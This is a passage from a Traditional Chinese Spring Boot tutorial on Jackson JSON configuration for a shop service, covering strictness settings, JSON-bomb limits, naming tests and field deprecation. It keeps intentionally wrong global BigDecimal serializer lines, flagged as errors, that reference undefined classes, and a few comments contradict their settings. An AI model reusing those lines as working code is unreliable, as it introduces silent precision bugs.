
```yaml
spring:
  jackson:
    # ── 輸出的欄位包含策略 ─────────────────────────────────────
    # ★ non_null：null 的欄位不出現在 JSON 裡
    #   理由（03-rest-api 3.7.1）：
    #     · 回應變小（一個 OrderDetail 少約 30% 的位元組）
    #     · 「欄位不存在」與「欄位是 null」在我們的契約裡語意相同
    #   ⚠️ 但這讓 PATCH 的「三態」無法用 null 表達 ——
    #      那是 JsonNullable 存在的理由（01 章 1.6.4、6.5.9）
    default-property-inclusion: non_null

    # ── 命名策略 ─────────────────────────────────────────────
    # ★ 不設定（用 Java 的欄位名）—— 我們的 DTO 本來就用 camelCase
    #   （03-rest-api 3.5.1 的決定）
    # property-naming-strategy: LOWER_CAMEL_CASE

    time-zone: UTC

    serialization:
      # ★ 時間用 ISO-8601 字串而不是 epoch 數字
      #   Boot 預設就是 false，明確寫出來是為了「不讓它被誤改」
      write-dates-as-timestamps: false
      # ★ Duration 也用 ISO-8601（PT15M）而不是奈秒數字
      write-durations-as-timestamps: false
      # ★ 空的物件（沒有任何 getter）不要拋例外 ——
      #   某些代理物件（Hibernate proxy）會觸發它
      fail-on-empty-beans: false
      # ★ 不要縮排 —— 生產環境的 JSON 不需要給人看，
      #   而縮排會讓回應大 20～30%
      #   ⚠️ 而且 05 章 5.9.4 的 NDJSON 依賴「一筆一行」，
      #      開了 INDENT_OUTPUT 會讓它完全壞掉
      indent-output: false
      # ★ Map 的 key 排序 —— 讓回應可 diff、讓測試穩定
      order-map-entries-by-keys: true
      # ★ 直接自我參照（obj.field == obj）時【拋例外】而不是靜默寫成 null
      #   ⚠️ 注意這個設定的方向很容易講反：
      #        true （Jackson 預設）→ 遇到直接自我參照就拋 JsonMappingException
      #        false                → 靜默寫成 null
      #      我們要 true，因為「回應裡多一個莫名的 null」比「500 + 告警」難查。
      #   ⚠️⚠️ 而它只攔【直接】自我參照（a.self == a）——
      #        a → b → a 這種【間接】循環它管不著，還是會 StackOverflow。
      #      真正的解法是「DTO 不該有循環」，由 6.7.4 的 DtoSerializabilityTest
      #      與 6.7.5 的 ArchUnit 規則（DTO 不可含 Entity）從型別層面保證。
      fail-on-self-references: true

    deserialization:
      # ★★ 未知欄位【要】報錯（03-rest-api 3.13.4）
      #   Boot 的預設是 false（忽略），我們刻意改成 true。
      #   理由：客戶端送 { "quantiy": 5 }（打錯字）時，
      #        忽略的話會用預設值建單 → 使用者買到錯的數量。
      #   ⚠️ 代價：我們加欄位時舊客戶端不會壞（它們不送新欄位），
      #        但如果我們【移除】欄位，還在送它的客戶端會 400。
      #        → 所以移除欄位要走 03-rest-api 第 06 章的棄用流程。
      fail-on-unknown-properties: true
      # ★ null 不能塞進基本型別（int / boolean）
      #   { "quantity": null } → 400 而不是靜默變成 0
      fail-on-null-for-primitives: true
      # ★ 未知的 enum 值不要拋例外（6.5.8 會詳談這個決定）
      read-unknown-enum-values-using-default-value: true
      # ★ 讀浮點數時用 BigDecimal（不是 double）—— 精度（6.5.7）
      use-big-decimal-for-floats: true
      # ★ 單一物件不可以當成單元素陣列
      #   { "items": {...} } 應該是 400 而不是被當成 [{...}]
      accept-single-value-as-array: false
      # ★ 缺少的 creator property 要報錯而不是塞 null
      fail-on-missing-creator-properties: false     # ⚠️ 見下面的說明

    mapper:
      # ★ 接受大小寫不同的 enum 值（"paid" → PAID）
      #   ⚠️ 這是一個「寬容」的決定，見 6.5.8 的討論
      accept-case-insensitive-enums: false
      # ★ 屬性名大小寫敏感（"OrderId" 不等於 "orderId"）
      accept-case-insensitive-properties: false
      # ★ @JsonView 不啟用時不要自動包含所有欄位
      #   Boot 預設就是 false
      default-view-inclusion: false
      # ★ getter 名稱的推導規則：標準 JavaBean（getURL → "URL"）
      #   還是 Jackson 傳統（getURL → "url"）？
      #   → false = Jackson 傳統。理由：我們的 DTO 全是 record，
      #     accessor 名就是欄位名（orderId() → "orderId"），
      #     兩種規則的結果一樣 —— 但「連續大寫的縮寫」會有差別，
      #     而 Jackson 傳統的 "url" 才是 camelCase（6.5.4 的命名決定）。
      #   ⚠️ 這一項與 enum 完全無關。
      #      「enum 要用 name() 而不是 toString()」是另外兩個設定：
      #        serialization.write-enums-using-to-string: false   （預設，我們保持）
      #        deserialization.read-enums-using-to-string: false  （預設，我們保持）
      #      理由見 03-rest-api 3.10.3：name() 是穩定的契約，
      #      toString() 可能被覆寫成中文顯示文字（而那正是 6.5.8 的 statusLabel 該做的事）。
      use-std-bean-naming: false

    generator:
      # ★★ BigDecimal 不用科學記號（6.2.3 的事故）
      #   ⚠️ 這一項在 shop-service 是「第二層防護」——
      #      第一層是「金額一律轉成字串」（6.5.7）。
      #      但如果有任何漏網的 BigDecimal 直接序列化，這一項會救它。
      write-bigdecimal-as-plain: true
      # ★ 非 ASCII 字元不要轉成 \\uXXXX escape
      #   （中文直接輸出，回應小得多，而且 log 可讀）
      escape-non-ascii: false

    parser:
      # ★ 不允許 JSON 的各種「寬鬆」擴充 —— 它們讓契約變模糊
      allow-comments: false
      allow-single-quotes: false
      allow-unquoted-field-names: false
      allow-trailing-comma: false
      # ★ NaN / Infinity 不是合法的 JSON
      allow-non-numeric-numbers: false
```

⚠️ **`fail-on-missing-creator-properties: false` 值得展開**（我刻意設成 `false`）：

```java
// ★ 完整版見 02 章 2.12.1；這裡只列出與這一項設定有關的欄位
public record CreateOrderRequest(
    @NotEmpty List<@Valid Item> items,
    @NotBlank String shippingAddressId,
    String couponCode                       // 選填
) {}
```

| 設定 | `{"items":[...]}`（缺 `shippingAddressId`）的行為 |
|---|---|
| `true` | 🔴 **400 `MALFORMED_REQUEST`** —— Jackson 在反序列化階段就拋 |
| **`false`** ✅ | `shippingAddressId` = `null` → 進 Bean Validation → **422 `VALIDATION_FAILED` + `errors[]` 指到 `shippingAddressId`** |

**為什麼 `false` 更好**：

```
設 true 的錯誤回應：
{
  "status": 400,
  "code": "MALFORMED_REQUEST",
  "detail": "Missing required creator property 'shippingAddressId'"
}
→ 客戶端只知道「有東西壞了」，而且它是 400（格式錯誤）不是 422（語意錯誤）

設 false 的錯誤回應：
{
  "status": 422,
  "code": "VALIDATION_FAILED",
  "errors": [
    { "field": "shippingAddressId", "code": "NotBlank", "message": "收件地址為必填" }
  ]
}
→ ✅ 前端可以直接把訊息標在那個欄位旁邊
```

> **這是一個「讓 Jackson 少做事、讓 Bean Validation 多做事」的決定。**
> 一般原則：**能用驗證表達的就不要用反序列化錯誤表達** ——
> 因為驗證的錯誤訊息可以定位到欄位、可以 i18n、可以一次回報多個（02 章第 2.9 節）。

**用 `Jackson2ObjectMapperBuilderCustomizer` 補上 YAML 表達不了的**：

```java
package example.shop.common.config;

import com.fasterxml.jackson.core.StreamReadConstraints;
import com.fasterxml.jackson.core.StreamWriteConstraints;
import com.fasterxml.jackson.databind.module.SimpleModule;
import example.shop.common.web.json.*;
import org.springframework.boot.autoconfigure.jackson.Jackson2ObjectMapperBuilderCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.math.BigDecimal;
import java.time.Instant;

/**
 * Jackson 的程式化設定。
 *
 * <p>★ 為什麼有些設定放 YAML、有些放這裡：
 * <table>
 *   <tr><th>放 YAML</th><th>放 Customizer</th></tr>
 *   <tr><td>布林開關（feature）</td><td>自訂 serializer / deserializer</td></tr>
 *   <tr><td>枚舉型的選項</td><td>{@code StreamReadConstraints}（YAML 表達不了）</td></tr>
 *   <tr><td>維運可能要調的</td><td>屬於「程式邏輯」的部分</td></tr>
 * </table>
 *
 * <p>⚠️ 同一項設定不要兩邊都寫 —— Customizer 會贏，
 * 而「YAML 寫了卻沒生效」是一個很難查的問題。
 */
@Configuration
public class JacksonConfig {

    @Bean
    public Jackson2ObjectMapperBuilderCustomizer shopJacksonCustomizer() {
        return builder -> {

            // ── ① 自訂的 serializer / deserializer（6.6）────────────
            SimpleModule module = new SimpleModule("shop-service");

            // 🔴🔴 這兩行是【錯的】—— 6.5.7 會說明為什麼並給出修正版。
            //   （簡短版：全域的 BigDecimal serializer 會把「重量 0.005」
            //     格式化成 "0.01" —— 100% 的精度損失，而且是靜默的。）
            //   ⚠️ 刻意留在這裡：「全域註冊一個型別的 serializer」是一個
            //      非常自然的第一直覺，看到它為什麼錯比直接給答案更有價值。
            //      MoneySerializer / MoneyDeserializer 因此【沒有】被定義。
            module.addSerializer(BigDecimal.class, new MoneySerializer());
            module.addDeserializer(BigDecimal.class, new MoneyDeserializer());

            // 時間：Instant → 固定格式的 ISO-8601（毫秒精度，6.5.6）
            module.addSerializer(Instant.class, new FixedPrecisionInstantSerializer());

            builder.modules(m -> m.add(module));

            // ── ② 安全上限（6.7.3）★★ ─────────────────────────────
            // ⚠️ 這些【只能】用程式設定（Boot 沒有對應的 property）
            builder.postConfigurer(objectMapper -> {
                objectMapper.getFactory().setStreamReadConstraints(
                        StreamReadConstraints.builder()
                                // ★ 巢狀深度：正常的訂單 JSON 最深 6 層，
                                //   50 給足夠餘裕但擋掉 [[[[...]]]] 的攻擊
                                .maxNestingDepth(50)
                                // ★ 單一字串長度：1 MB
                                //   （Jackson 2.15 的預設是 20 MB —— 太寬鬆）
                                .maxStringLength(1_000_000)
                                // ★ 數字長度：1000 位（防 BigDecimal 的計算爆炸）
                                .maxNumberLength(1_000)
                                // ★ 屬性名長度：256          ⚠️ Jackson 2.16+
                                .maxNameLength(256)
                                // ★ 整份文件：2 MB（與 api.limits.max-request-body-bytes 一致）
                                //                              ⚠️ Jackson 2.16+
                                .maxDocumentLength(2_000_000)
                                .build());

                // ⚠️ StreamWriteConstraints 整個 API 是 Jackson 2.16+
                objectMapper.getFactory().setStreamWriteConstraints(
                        StreamWriteConstraints.builder()
                                .maxNestingDepth(50)
                                .build());
            });

            // ── ③ 不要註冊 default typing ★ ────────────────────────
            // ⚠️ 這裡什麼都不做，但值得一行註解：
            //    絕不呼叫 activateDefaultTyping()（6.7.1 的 RCE 風險）
        };
    }
}
```

> ### ⚠️⚠️ 版本：`maxNameLength` / `maxDocumentLength` / `StreamWriteConstraints`
> ### 需要 Jackson **2.16+** ★★
>
> 本課程的基準是 **Spring Boot 3.2.5，它管理的 Jackson 是 2.15.4** ——
> 上面那三項在 2.15 上**不存在**，寫了會編譯失敗：
>
> ```
> error: cannot find symbol
>   symbol:   method maxNameLength(int)
>   location: class com.fasterxml.jackson.core.StreamReadConstraints.Builder
> ```
>
> | 設定 | 進來的版本 | 2.15 有嗎 |
> |---|---|---|
> | `maxNestingDepth`（read） | 2.15 | ✅ |
> | `maxStringLength` | 2.15 | ✅ |
> | `maxNumberLength` | 2.15 | ✅ |
> | **`maxNameLength`** | **2.16** | 🔴 |
> | **`maxDocumentLength`** | **2.16** | 🔴 |
> | **`StreamWriteConstraints`（整個類別）** | **2.16** | 🔴 |
>
> **shop-service 的決定：明確拉高 Jackson 的版本。**
>
> ```xml
> <properties>
>   <!-- ★★ 覆寫 Boot 3.2.5 管理的 2.15.4。
>        理由：6.7.3 的 JSON 炸彈防護需要 maxDocumentLength
>        （沒有它的話「20 MB 的字串 × 50 併發」那一層就少了一道）。
>        ⚠️ 這是一個「刻意偏離 Boot BOM」的決定，必須寫下理由，
>          而且升級 Boot 時要回頭確認能不能移除。 -->
>   <jackson-bom.version>2.17.2</jackson-bom.version>
> </properties>
> ```
>
> ⚠️ **覆寫 Boot 管理的版本是有風險的動作**，所以要有一個測試守著：
>
> ```java
> @Test
> @DisplayName("★ Jackson 的版本足以支援我們用到的所有設定")
> void jackson版本() {
>     // ★ 直接問「這個 API 存不存在」，比斷言版本字串可靠
>     //   （版本字串的格式會變，而且 shaded 的 jar 可能回報奇怪的值）
>     assertThatCode(() -> StreamReadConstraints.builder()
>                     .maxNameLength(256)
>                     .maxDocumentLength(2_000_000)
>                     .build())
>             .as("""
>                 Jackson 的版本不支援 maxNameLength / maxDocumentLength（需要 2.16+）。
>
>                 最可能的原因：有人移除了 pom.xml 裡的 jackson-bom.version 覆寫，
>                 於是回到 Boot 3.2.5 管理的 2.15.4。
>
>                 後果：6.7.3 的兩層 JSON 炸彈防護消失，而【編譯會失敗】——
>                 所以這個測試主要的價值是「失敗訊息告訴你為什麼」。
>                 """)
>             .doesNotThrowAnyException();
>
>     assertThat(com.fasterxml.jackson.core.json.PackageVersion.VERSION.getMinorVersion())
>             .as("Jackson 的 minor 版本必須 >= 16")
>             .isGreaterThanOrEqualTo(16);
> }
> ```
>
> **★ 如果你不想偏離 Boot BOM**（完全合理的選擇），
> 就把那三行拿掉，並接受兩件事：
>
> | 少了什麼 | 補償 |
> |---|---|
> | `maxDocumentLength` | 靠 05 章 5.3.7 的 `RequestSizeLimitFilter`（讀 `Content-Length`）—— ⚠️ 但 chunked encoding 沒有 `Content-Length`，所以這一層會漏 |
> | `maxNameLength` | 沒有直接的替代。⚠️ 但 06 章 6.5.5 的 `fail-on-unknown-properties: true` 讓「超長的未知欄位名」變成 400，所以影響有限 |
> | `StreamWriteConstraints` | 靠 6.7.4 的 `DtoSerializabilityTest`（型別層面保證 DTO 沒有循環參照） |
>
> ★ **而 02 章 2.11.3 已經標註過同一件事** ——
> 兩節的版本說明必須一致，這是 07 章 7.10 那類「契約測試」精神的手動版。

⚠️ **`builder.postConfigurer()` 在 `builder.build()` 之後執行** ——
這是唯一能拿到 `JsonFactory` 的方式（`Jackson2ObjectMapperBuilder` 沒有暴露它）。

### 6.5.4 命名策略：一個「不要改」的決定

```yaml
    # ❌ 不要設
    # property-naming-strategy: SNAKE_CASE
```

**為什麼 shop-service 不用 snake_case**（03-rest-api 3.5.1 的決定，這裡看實作面）：

| 策略 | JSON | Java DTO | 問題 |
|---|---|---|---|
| **camelCase**（不設定） | `{"orderId": "..."}` | `String orderId` | ✅ 一對一，零轉換 |
| `SNAKE_CASE` | `{"order_id": "..."}` | `String orderId` | ⚠️ 見下 |

**`SNAKE_CASE` 的四個實務問題**：

**① 它是全域的，而某些欄位不該被轉換**

```java
public record OrderDetail(
    String orderId,          // → order_id      ✅
    String customerId,       // → customer_id   ✅
    Map<String, Object> metadata   // ⚠️ Map 的 key 【不會】被轉換
) {}
```

```json
{
  "order_id": "ord_1",
  "metadata": { "sourceChannel": "APP" }     ← 🔴 這裡還是 camelCase
}
```

**同一份回應裡兩種命名風格** —— 而前端要處理兩種。

**② 縮寫的轉換不直觀**

```java
String customerVIPLevel;    // → customer_vip_level  或  customer_v_i_p_level？
String orderURL;            // → order_url  或  order_u_r_l？
String httpStatus;          // → http_status
```

Jackson 的 `SnakeCaseStrategy` 對連續大寫的處理是
「每個大寫字母前加底線」→ `customer_v_i_p_level`。

**修法是「不要用縮寫」**（03-rest-api 3.5.2 的規則），但那需要紀律。

**③ 錯誤回應的 `errors[].field` 用哪一種？**

```json
{
  "code": "VALIDATION_FAILED",
  "errors": [
    { "field": "shipping_address.postal_code", "code": "Pattern", ... }
  ]
}
```

⚠️ **02 章 2.9.3 的 `FieldViolation.field` 來自 Bean Validation 的 property path
—— 那是 **Java 的欄位名**（`shippingAddress.postalCode`）。

要讓它變成 snake_case，需要在 `ValidationErrorTranslator` 裡做一次轉換 ——
**而那個轉換必須與 Jackson 的策略完全一致**，否則前端拿到的 `field`
對不上它送的欄位名。**這是一個真實會出錯的地方。**

**④ OpenAPI 的 schema 與 Java 型別不一致**

產生的客戶端程式碼要嘛用 `order_id`（不符合目標語言的慣例），
要嘛需要再一層對映設定。

**什麼時候該用 snake_case**：

| 情況 | 說明 |
|---|---|
| 你的 API 主要被 Python / Ruby 客戶端使用 | 那些語言的慣例是 snake_case |
| 你的公司有一份跨團隊的 API 規範要求 snake_case | 一致性 > 個別專案的便利 |
| 你要對接一個既有的 snake_case API | 別無選擇 |

⚠️ **無論選哪個，最重要的是「全站一致」**。
**最糟的情況是「大部分 camelCase，但某幾支端點 snake_case」** ——
那通常是因為某個 DTO 用了 `@JsonProperty("order_id")`。

**一個守住一致性的測試**：

```java
package example.shop.contract;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 「所有回應的欄位名都是 camelCase」的契約測試。
 *
 * <p>★ 做法：把每一個 DTO 序列化成 JSON，遞迴檢查所有的 key。
 *
 * <p>⚠️ 這個測試需要「所有 DTO 的範例實例」——
 * 手動維護會過時。實務上有兩個做法：
 * <ol>
 *   <li>用 {@code instancio} / {@code easy-random} 自動產生實例。</li>
 *   <li><b>從 OpenAPI 文件檢查</b>（03-rest-api 第 07 章的 {@code orders-api.yaml}）——
 *       那份文件本來就是契約的真相，而且不會漏掉任何端點。</li>
 * </ol>
 * shop-service 用第二種（見 6.10.4）。這裡先示範第一種的核心邏輯。
 */
class JsonNamingConventionTest {

    /** camelCase：開頭小寫，之後只有英數字。 */
    private static final Pattern CAMEL_CASE = Pattern.compile("^[a-z][a-zA-Z0-9]*$");

    /**
     * 允許的例外。
     *
     * <p>★ 這個清單本身就是文件：它告訴讀者「哪些欄位刻意不符合慣例，為什麼」。
     */
    private static final List<String> ALLOWED_EXCEPTIONS = List.of(
            "_eof",          // 05 章 5.9.4 的 NDJSON sentinel（底線前綴表示「非資料」）
            "_links");       // 若未來加 HATEOAS

    @Test
    @DisplayName("所有回應欄位都是 camelCase")
    void 命名一致() throws Exception {
        ObjectMapper mapper = new ObjectMapper();     // ⚠️ 測試裡可以（只是為了走訪 JSON）
        List<String> violations = new ArrayList<>();

        for (Object sample : SampleResponses.all()) {
            JsonNode tree = mapper.valueToTree(sample);
            checkNode(tree, sample.getClass().getSimpleName(), violations);
        }

        assertThat(violations)
                .as("以下欄位名不是 camelCase")
                .isEmpty();
    }

    private static void checkNode(JsonNode node, String path, List<String> violations) {
        if (node.isObject()) {
            node.fieldNames().forEachRemaining(name -> {
                if (!CAMEL_CASE.matcher(name).matches()
                        && !ALLOWED_EXCEPTIONS.contains(name)) {
                    violations.add("%s → %s".formatted(path, name));
                }
                checkNode(node.get(name), path + "." + name, violations);
            });
        } else if (node.isArray()) {
            for (JsonNode child : node) {
                checkNode(child, path + "[]", violations);
            }
        }
    }
}
```

⚠️ **`ALLOWED_EXCEPTIONS` 用底線前綴表示「非資料欄位」** ——
這是一個常見的慣例（`_eof`、`_links`、`_meta`），
而把它寫進測試的例外清單，讓「新增一個底線前綴欄位」需要一次明確的決定。

### 6.5.5 未知欄位：一個「嚴格」的決定與它的代價

```yaml
    deserialization:
      fail-on-unknown-properties: true      # ★ Boot 的預設是 false
```

**這個決定的正反面**：

```http
POST /orders
Content-Type: application/json

{
  "items": [ { "productId": "P-1001", "quantiy": 5 } ],
  "shippingAddressId": "adr_01J5GKA1B2C3D4E5F6G7H8"
}
```

| 設定 | 行為 |
|---|---|
| `false`（Boot 預設） | `quantiy` 被忽略 → `quantity` 是 `null` → 驗證失敗 → 422。**還算可以** |
| `false` + `quantity` 有 `defaultValue` | 🔴 **靜默用預設值建單** —— 使用者買到 1 件而不是 5 件 |
| **`true`** ✅ | 400 + `unknownProperty: "items[0].quantiy"` + 「您是否想輸入 quantity？」（03 章 3.9.5） |

⚠️ **第二列是真正的災難情境**，而它比想像中常見：
任何有預設值的欄位（`quantity`、`page`、`size`、`priority`）都可能被打錯字，
然後**靜默地用預設值**。

**代價：移除欄位變成破壞性變更。**

```
v1 的 CreateOrderRequest 有一個 legacyPromoCode 欄位
v2 我們移除了它（改用 couponCode）

→ 還在送 legacyPromoCode 的舊 App
  · fail-on-unknown-properties: false → ✅ 繼續正常運作
  · fail-on-unknown-properties: true  → 🔴 400，所有下單失敗
```

**所以移除欄位必須走一個流程**（03-rest-api 第 06 章的棄用流程在 shop-service 的落地）：

```java
package example.shop.order.web.dto;

import com.fasterxml.jackson.annotation.JsonIgnore;
import com.fasterxml.jackson.annotation.JsonProperty;

/**
 * 建立訂單的請求。
 *
 * <p>★ 欄位移除的三階段流程（6.5.5）：
 * <pre>
 * 階段 1（現在）：欄位還在，但標記 @Deprecated，並在文件與回應標頭公告
 *                 · 收到它就記一筆指標（誰還在送）
 *                 · 完全不使用它的值
 * 階段 2（90 天後）：指標歸零之後才移除
 * 階段 3：           移除欄位。此時 fail-on-unknown-properties 會讓殘留的客戶端 400 ——
 *                    但我們已經確認沒有人在送了
 * </pre>
 *
 * <p>⚠️ 沒有「階段 1 的指標」就不敢做階段 3 ——
 * 而不敢移除的欄位會永遠留著，十年後沒人知道它是幹什麼的。
 */
public record CreateOrderRequest(

    // ★ 欄位與 02 章 2.12.1 的正式版一致（items / shippingAddressId / couponCode /
    //   customerNote / invoice）——這裡只多了一個要棄用的 legacyPromoCode。
    //   ⚠️ 為了聚焦，customerNote 與 invoice 在這個片段裡省略。
    @jakarta.validation.constraints.NotEmpty
    @jakarta.validation.constraints.Size(max = 50)
    @jakarta.validation.Valid
    java.util.List<Item> items,

    @jakarta.validation.constraints.NotBlank
    @example.shop.common.validation.ResourceId
    String shippingAddressId,

    @jakarta.validation.constraints.Size(max = 32)
    String couponCode,

    /**
     * @deprecated 自 2026-08-01 起改用 {@link #couponCode}。
     *             預計 2026-11-01 移除。
     *
     * <p>★ 保留這個欄位的唯一理由是「不要讓舊客戶端 400」。
     * 它的值<b>完全不被使用</b>（見 {@link #effectiveCouponCode()}）。
     *
     * <p>⚠️ 不要試圖「兩個都支援」（couponCode 為空時用 legacyPromoCode）——
     * 那會讓棄用永遠無法完成，因為客戶端沒有動力遷移。
     */
    @Deprecated(since = "2026-08-01", forRemoval = true)
    @JsonProperty("legacyPromoCode")
    @jakarta.validation.constraints.Size(max = 32)
    String legacyPromoCode

) {
    /** ★ 明確只用新欄位 —— 讓「舊欄位無效」變成程式碼裡的事實。 */
    @JsonIgnore
    public String effectiveCouponCode() {
        return couponCode;
    }

    /** ★ 給 Controller 用來記指標。 */
    @JsonIgnore
    public boolean usesDeprecatedFields() {
        return legacyPromoCode != null;
    }
}
```

```java
    @PostMapping("/orders")
    public ResponseEntity<CreateOrderResponse> create(
            @RequestBody @Valid CreateOrderRequest request,
            @CurrentActor Actor actor,
            @RequestHeader(value = "User-Agent", required = false) String userAgent) {

        if (request.usesDeprecatedFields()) {
            // ★ 記指標而不是記 log：
            //   log 會被淹沒，而指標可以畫成「還有多少客戶端在送」的曲線，
            //   讓「什麼時候可以移除」變成一個可以看的數字。
            meterRegistry.counter("shop.api.deprecated_field_used",
                    "endpoint", "POST /orders",
                    "field", "legacyPromoCode",
                    // ⚠️ 不要用完整的 User-Agent 當標籤（基數爆炸，03 章 3.12.3）——
                    //    只取「客戶端類型」
                    "client", ClientClassifier.classify(userAgent)).increment();
        }

        var result = orderService.create(
                mapper.toCommand(request, actor, idempotencyKey));

        var builder = ResponseEntity.created(locationOf(result));
        if (request.usesDeprecatedFields()) {
            // ★ RFC 8594 的 Sunset 標頭 + 一個給人看的警告
            builder.header("Deprecation", "true")
                   .header("Sunset", "Sat, 01 Nov 2026 00:00:00 GMT")
                   .header("Warning",
                           "299 - \"legacyPromoCode is deprecated; use couponCode\"");
        }
        return builder.body(mapper.toResponse(result));
    }
```

⚠️ **`Warning` 標頭在 HTTP 規格上已被棄用（RFC 9111 移除了它）**，
但**它仍然是唯一能讓工程師在 devtools 裡「看到」棄用訊息的方式**。
`Deprecation` 與 `Sunset`（RFC 8594）是正式的做法，但沒有人會注意到它們。
**shop-service 三個都送** —— 這是「規格正確性」與「真的被看到」的取捨。

**`fail-on-unknown-properties` 的一個例外：`PATCH`。**

```java
    /**
     * ⚠️ 這個 DTO 刻意允許未知欄位。
     *
     * <p>理由：merge-patch（RFC 7396）的語意是「只送要改的欄位」，
     * 而客戶端可能會把「它從 GET 拿到的完整物件」改一個欄位後整包送回來 ——
     * 那裡面會有唯讀欄位（{@code orderId}、{@code createdAt}、{@code status}）。
     *
     * <p>★ 對它們回 400 是「技術上正確但實務上惱人」。
     * 但<b>直接忽略也不對</b>（客戶端以為它改了 status）。
     *
     * <p><b>shop-service 的做法</b>：明確宣告這些欄位是唯讀，
     * 收到就回 403 {@code FORBIDDEN_PARAMETER}（03 章的 code）——
     * 那比 400（格式錯誤）與靜默忽略都好。
     */
    @com.fasterxml.jackson.annotation.JsonIgnoreProperties(ignoreUnknown = false)
    public record UpdateOrderRequest(
        JsonNullable<ShippingAddress> shippingAddress,
        JsonNullable<String> customerNote,

        // ★ 唯讀欄位「宣告出來」，但只用來偵測與拒絕
        @ReadOnlyField String orderId,
        @ReadOnlyField String status,
        @ReadOnlyField java.time.Instant createdAt
    ) {}
```

```java
package example.shop.common.web;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * 標記一個「客戶端不可修改」的欄位。
 *
 * <p>★ 它與「不要在 DTO 裡放這個欄位」的差別：
 * <table>
 *   <tr><th></th><th>不放進 DTO</th><th>放進 DTO 但標記 @ReadOnlyField</th></tr>
 *   <tr><td>客戶端送了它</td><td>400 unknown property</td><td><b>403 FORBIDDEN_PARAMETER</b></td></tr>
 *   <tr><td>錯誤訊息</td><td>「不認識這個欄位」（誤導）</td><td>「這個欄位不可修改」（正確）</td></tr>
 *   <tr><td>OpenAPI</td><td>看不到</td><td>可標 {@code readOnly: true}</td></tr>
 * </table>
 *
 * <p>由 {@code ReadOnlyFieldValidator}（6.9.3）在 Controller 之前檢查。
 */
@Target(ElementType.RECORD_COMPONENT)
@Retention(RetentionPolicy.RUNTIME)
public @interface ReadOnlyField {
    /** 給錯誤訊息用的說明。 */
    String value() default "";
}
```

### 6.5.6 日期與時間：三個必須做的決定

**決定 1：DTO 裡只用 `Instant`（或 `OffsetDateTime`），絕不用 `LocalDateTime`。**

```java
// 🔴 6.2.3 的事故來源
public record OrderSummary(String orderId, LocalDateTime createdAt) {}
```

| 型別 | JSON | 有時區資訊？ |
|---|---|---|
| `LocalDateTime` | `"2026-08-01T02:30:00"` | 🔴 **沒有** —— 讀的人只能猜 |
| `LocalDate` | `"2026-08-01"` | 沒有（但「日期」通常不需要，✅ 可用） |
| **`Instant`** ✅ | `"2026-08-01T02:30:00Z"` | ✅ 一定是 UTC |
| `OffsetDateTime` | `"2026-08-01T10:30:00+08:00"` | ✅ 帶偏移 |
| `ZonedDateTime` | `"2026-08-01T10:30:00+08:00[Asia/Taipei]"` | ⚠️ 帶區域名 —— **不是標準 ISO-8601**，很多客戶端解析失敗 |

**shop-service 用 `Instant`**（03-rest-api 3.6.1 的決定）。

⚠️ **`ZonedDateTime` 的 `[Asia/Taipei]` 後綴是 Java 的擴充**，不在 ISO-8601 裡。
JavaScript 的 `new Date("2026-08-01T10:30:00+08:00[Asia/Taipei]")` 回 `Invalid Date`。
**永遠不要把 `ZonedDateTime` 放進 DTO。**

**一條 ArchUnit 規則**：

```java
    @ArchTest
    static final ArchRule DTO不可用LocalDateTime = noClasses()
            .that().resideInAPackage("..web.dto..")
            .should().dependOnClassesThat()
            .haveFullyQualifiedName("java.time.LocalDateTime")
            .orShould().dependOnClassesThat()
            .haveFullyQualifiedName("java.time.ZonedDateTime")
            .because("""
                    LocalDateTime 沒有時區資訊（06 章 6.2.3 的對帳事故），
                    ZonedDateTime 的 [Asia/Taipei] 後綴不是標準 ISO-8601。
                    請用 Instant。
                    需要「日期」（不含時間）時用 LocalDate 是可以的。
                    """);
```

**決定 2：精度固定為毫秒。** ★

```java
// 沒有處理的話
Instant.now()                              // → 2026-08-24T03:14:22.123456789Z
```

**九位小數（奈秒）造成三個問題**：

| 問題 | 說明 |
|---|---|
| **資料庫來回不一致** | MySQL 的 `DATETIME(6)` 是微秒（六位）。寫入 `...123456789Z` 讀回來是 `...123457Z`（四捨五入）→ **同一筆資料在「建立後的回應」與「重新查詢的回應」裡時間不同** |
| **測試脆弱** | `assertThat(response.createdAt()).isEqualTo(expected)` 幾乎必失敗 |
| **平台差異** | `Instant.now()` 的實際精度依 JVM 與 OS 而異（Java 9+ 在 Linux 上給微秒或奈秒，某些容器只給毫秒）→ **同一份程式碼在本機與正式環境輸出格式不同** |

⚠️ **第一個問題最貴**：客戶端如果用 `createdAt` 當「這筆資料有沒有變」的判斷依據
（或當 cursor 分頁的游標，03-rest-api 5.6），就會拿到不一致的結果。

```java
package example.shop.common.web.json;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

import java.io.IOException;
import java.time.Instant;
import java.time.temporal.ChronoUnit;

/**
 * 固定毫秒精度的 {@link Instant} 序列化。
 *
 * <p>★ 為什麼不用 {@code @JsonFormat(pattern = ...)}：
 * <ul>
 *   <li>pattern 要寫在<b>每一個</b>欄位上（幾百個地方）。</li>
 *   <li>{@code Instant} 配 pattern 需要指定 {@code timezone}，
 *       <b>忘記指定時會用 JVM 預設時區</b> —— 那是一個靜默的 bug
 *       （本機是 Asia/Taipei，容器是 UTC，輸出不同）。</li>
 * </ul>
 *
 * <p>★ 為什麼是「截斷」而不是「四捨五入」：
 * 截斷保證 {@code 序列化(x) <= x}，也就是回傳的時間不會「早於」實際發生的時間之後。
 * 對「建立時間」這種語意，寧可少一點也不要多。
 *
 * <p>⚠️ 輸出格式固定為 {@code yyyy-MM-ddTHH:mm:ss.SSSZ}（一定有三位小數）——
 * 包含 {@code .000}。
 * 這讓客戶端的解析器不用處理「有時有小數有時沒有」，
 * 也讓字串比較（cursor 分頁）與時間比較的順序一致。
 */
public class FixedPrecisionInstantSerializer extends StdSerializer<Instant> {

    public FixedPrecisionInstantSerializer() {
        super(Instant.class);
    }

    @Override
    public void serialize(Instant value, JsonGenerator gen, SerializerProvider provider)
            throws IOException {
